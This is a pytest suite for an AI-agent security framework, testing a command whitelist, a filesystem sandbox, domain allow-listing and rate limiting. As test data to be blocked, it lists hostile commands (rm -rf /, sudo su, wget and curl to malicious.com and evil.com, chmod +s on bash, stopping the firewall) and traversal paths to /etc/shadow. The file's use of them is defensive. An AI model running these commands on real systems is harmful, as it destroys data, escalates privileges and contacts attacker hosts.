"""
Test suite for security framework
"""

import pytest
import tempfile
import shutil
import os
from pathlib import Path
from unittest.mock import patch, MagicMock

from tools.security_framework import (
    SecurityManager, CommandWhitelist, FileSystemSandbox, 
    NetworkSecurityManager, SecurityLevel, SecurityAction
)


class TestCommandWhitelist:
    """Test command whitelist functionality"""
    
    def setup_method(self):
        """Setup test environment"""
        self.whitelist = CommandWhitelist()
    
    def test_allowed_commands(self):
        """Test that allowed commands pass validation"""
        allowed_commands = [
            "echo hello",
            "ls -la",
            "python script.py",
            "git status",
            "npm install"
        ]
        
        for command in allowed_commands:
            is_allowed, reason = self.whitelist.is_command_allowed(command)
            assert is_allowed, f"Command should be allowed: {command}, reason: {reason}"
    
    def test_forbidden_commands(self):
        """Test that forbidden commands are blocked"""
        forbidden_commands = [
            "rm -rf /",
            "sudo su",
            "wget http://malicious.com/script.sh",
            "curl -X POST http://evil.com",
            "chmod +s /bin/bash"
        ]
        
        for command in forbidden_commands:
            is_allowed, reason = self.whitelist.is_command_allowed(command)
            assert not is_allowed, f"Command should be blocked: {command}"
            assert reason is not None
    
    def test_dangerous_patterns(self):
        """Test detection of dangerous patterns"""
        dangerous_commands = [
            "python -c 'eval(input())'",
            "node -e 'exec(require(\"child_process\").spawn)'",
            "rm some_file -rf",
            "systemctl stop firewall"
        ]
        
        for command in dangerous_commands:
            is_allowed, reason = self.whitelist.is_command_allowed(command)
            assert not is_allowed, f"Dangerous pattern should be blocked: {command}"
    
    def test_custom_commands(self):
        """Test adding custom allowed commands"""
        custom_command = "my_custom_tool"
        
        # Should be blocked initially
        is_allowed, _ = self.whitelist.is_command_allowed(custom_command)
        assert not is_allowed
        
        # Add to whitelist
        self.whitelist.add_allowed_command(custom_command, "custom")
        
        # Should be allowed now
        is_allowed, _ = self.whitelist.is_command_allowed(custom_command)
        assert is_allowed


class TestFileSystemSandbox:
    """Test file system sandbox functionality"""
    
    def setup_method(self):
        """Setup test environment"""
        self.temp_dir = tempfile.mkdtemp()
        self.sandbox = FileSystemSandbox(self.temp_dir)
        self.test_agent_id = "test_agent"
    
    def teardown_method(self):
        """Clean up test environment"""
        shutil.rmtree(self.temp_dir)
    
    def test_sandbox_structure_creation(self):
        """Test that sandbox structure is created correctly"""
        expected_dirs = ["agents", "shared", "templates", "dependencies", "logs", "temp"]
        
        for directory in expected_dirs:
            dir_path = Path(self.temp_dir) / directory
            assert dir_path.exists(), f"Directory should exist: {directory}"
            assert dir_path.is_dir(), f"Path should be directory: {directory}"
    
    def test_agent_sandbox_creation(self):
        """Test agent-specific sandbox creation"""
        agent_path = self.sandbox.get_agent_sandbox_path(self.test_agent_id)
        
        assert agent_path.exists()
        assert agent_path.is_dir()
        
        # Check subdirectories
        expected_subdirs = ["workspace", "temp", "output", "logs"]
        for subdir in expected_subdirs:
            subdir_path = agent_path / subdir
            assert subdir_path.exists(), f"Agent subdir should exist: {subdir}"
    
    def test_path_validation_allowed(self):
        """Test validation of allowed paths"""
        agent_path = self.sandbox.get_agent_sandbox_path(self.test_agent_id)
        test_file_path = agent_path / "workspace" / "test.txt"
        
        is_valid, resolved_path = self.sandbox.validate_path(str(test_file_path), self.test_agent_id)
        
        assert is_valid
        assert resolved_path == test_file_path.resolve()
    
    def test_path_validation_forbidden(self):
        """Test validation blocks forbidden paths"""
        forbidden_paths = [
            "/etc/passwd",
            "/tmp/../etc/shadow",
            "../../etc/hosts",
            "/usr/bin/sudo"
        ]
        
        for path in forbidden_paths:
            is_valid, resolved_path = self.sandbox.validate_path(path, self.test_agent_id)
            assert not is_valid, f"Path should be blocked: {path}"
    
    def test_safe_file_operations(self):
        """Test safe file read/write operations"""
        agent_path = self.sandbox.get_agent_sandbox_path(self.test_agent_id)
        test_file = "workspace/test_file.txt"
        test_content = "Hello, sandbox world!"
        
        # Test write
        success, error = self.sandbox.safe_write_file(test_file, test_content, self.test_agent_id)
        assert success, f"Write should succeed, error: {error}"
        
        # Test read
        success, content, error = self.sandbox.safe_read_file(test_file, self.test_agent_id)
        assert success, f"Read should succeed, error: {error}"
        assert content == test_content
    
    def test_directory_traversal_prevention(self):
        """Test prevention of directory traversal attacks"""
        malicious_paths = [
            "../../../etc/passwd",
            "workspace/../../../../../../etc/shadow",
            "workspace/../../../tmp/malicious.sh"
        ]
        
        for path in malicious_paths:
            success, error = self.sandbox.safe_write_file(path, "malicious", self.test_agent_id)
            assert not success, f"Malicious path should be blocked: {path}"
            
            success, content, error = self.sandbox.safe_read_file(path, self.test_agent_id)
            assert not success, f"Malicious path should be blocked: {path}"


class TestNetworkSecurityManager:
    """Test network security management"""
    
    def setup_method(self):
        """Setup test environment"""
        self.network_security = NetworkSecurityManager()
        self.test_agent_id = "test_agent"
    
    def test_allowed_domains(self):
        """Test that allowed domains pass validation"""
        allowed_urls = [
            "https://api.anthropic.com/v1/chat",
            "https://github.com/user/repo",
            "https://stackoverflow.com/questions/123"
        ]
        
        for url in allowed_urls:
            is_allowed, reason = self.network_security.is_domain_allowed(url)
            assert is_allowed, f"URL should be allowed: {url}, reason: {reason}"
    
    def test_blocked_domains(self):
        """Test that non-allowed domains are blocked"""
        blocked_urls = [
            "https://malicious.com/steal-data",
            "http://suspicious-site.net",
            "https://unknown-domain.org/api"
        ]
        
        for url in blocked_urls:
            is_allowed, reason = self.network_security.is_domain_allowed(url)
            assert not is_allowed, f"URL should be blocked: {url}"
            assert reason is not None
    
    def test_rate_limiting(self):
        """Test rate limiting functionality"""
        # Make requests up to the limit
        for i in range(101):  # Test 101 requests against limit of 100
            is_allowed, reason = self.network_security.check_rate_limit(self.test_agent_id, "requests")
            if i < 100:  # First 100 requests should be allowed (0-99)
                assert is_allowed, f"Request {i} should be allowed"
            else:  # 101st request should be blocked
                assert not is_allowed, "Rate limit should be exceeded"
    
    def test_rate_limit_cleanup(self):
        """Test that old rate limit entries are cleaned up"""
        # Mock time to simulate hour passing
        with patch('time.time') as mock_time:
            # Start at time 0
            mock_time.return_value = 0
            
            # Make a request
            is_allowed, _ = self.network_security.check_rate_limit(self.test_agent_id, "requests")
            assert is_allowed
            
            # Move time forward by 2 hours
            mock_time.return_value = 7200  # 2 hours later
            
            # Make another request - should be allowed as old entry is cleaned
            is_allowed, _ = self.network_security.check_rate_limit(self.test_agent_id, "requests")
            assert is_allowed


class TestSecurityManager:
    """Test integrated security manager"""
    
    def setup_method(self):
        """Setup test environment"""
        self.temp_dir = tempfile.mkdtemp()
        self.security_manager = SecurityManager(self.temp_dir)
        self.test_agent_id = "test_agent"
    
    def teardown_method(self):
        """Clean up test environment"""
        shutil.rmtree(self.temp_dir)
    
    def test_command_validation_integration(self):
        """Test integrated command validation"""
        # Test allowed command
        is_allowed, reason = self.security_manager.validate_command_execution(
            "echo hello", self.test_agent_id
        )
        assert is_allowed
        
        # Test forbidden command
        is_allowed, reason = self.security_manager.validate_command_execution(
            "rm -rf /", self.test_agent_id
        )
        assert not is_allowed
        assert reason is not None
    
    def test_file_access_validation_integration(self):
        """Test integrated file access validation"""
        # Test allowed path
        is_allowed, reason = self.security_manager.validate_file_access(
            "workspace/test.txt", self.test_agent_id, "read"
        )
        assert is_allowed
        
        # Test forbidden path
        is_allowed, reason = self.security_manager.validate_file_access(
            "/etc/passwd", self.test_agent_id, "read"
        )
        assert not is_allowed
        assert reason is not None
    
    def test_network_validation_integration(self):
        """Test integrated network validation"""
        # Test allowed URL
        is_allowed, reason = self.security_manager.validate_network_request(
            "https://api.anthropic.com/v1/chat", self.test_agent_id
        )
        assert is_allowed
        
        # Test blocked URL
        is_allowed, reason = self.security_manager.validate_network_request(
            "https://malicious.com/steal", self.test_agent_id
        )
        assert not is_allowed
        assert reason is not None
    
    def test_security_reporting(self):
        """Test security report generation"""
        # Generate some security events
        self.security_manager.validate_command_execution("rm -rf /", self.test_agent_id)
        self.security_manager.validate_file_access("/etc/passwd", self.test_agent_id, "read")
        
        # Generate report
        report = self.security_manager.get_security_report(24)
        
        assert "total_events" in report
        assert "events_by_type" in report
        assert "events_by_severity" in report
        assert report["total_events"] >= 2  # At least our test events
    
    def test_security_event_logging(self):
        """Test security event logging"""
        # Trigger a security event
        self.security_manager.validate_command_execution("sudo su", self.test_agent_id)
        
        # Check if event was logged
        recent_events = self.security_manager.security_logger.get_recent_events(1)
        assert len(recent_events) > 0
        
        # Check event details
        event = recent_events[-1]  # Last event
        assert event.event_type == "command_blocked"
        assert event.agent_id == self.test_agent_id
        assert event.action_taken == SecurityAction.DENY


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
